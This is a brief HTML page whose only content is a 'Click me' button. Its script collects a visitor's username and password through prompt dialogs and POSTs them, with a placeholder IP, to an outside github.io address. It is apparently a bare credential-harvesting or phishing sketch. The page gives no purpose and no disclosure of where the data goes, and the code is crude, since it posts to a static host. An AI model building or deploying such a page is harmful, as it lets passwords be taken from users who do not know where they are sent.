<!DOCTYPE html>
<html>
<body>
<button onclick="openLoginForm()">Click me</button>
	<script>
  function openLoginForm(){
    let username = prompt("Please enter your username:");
    let password = prompt("Please enter your password:");
    
    // Record IP address
    let ip = "127.0.0.1"; // Developer mode output pre-set IP
    let data = { 
      'username': username,
      'password': password,
      'ip': ip
    };
    
    // Send data to server
    fetch('https://ianchzhu.github.io/SCLS/', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: {
        'Content-Type': 'application/json'
      }
    }).then(response => {
        console.log("Data successfully recorded for user: " + username);
    });
  }
</script>

</body>
</html>
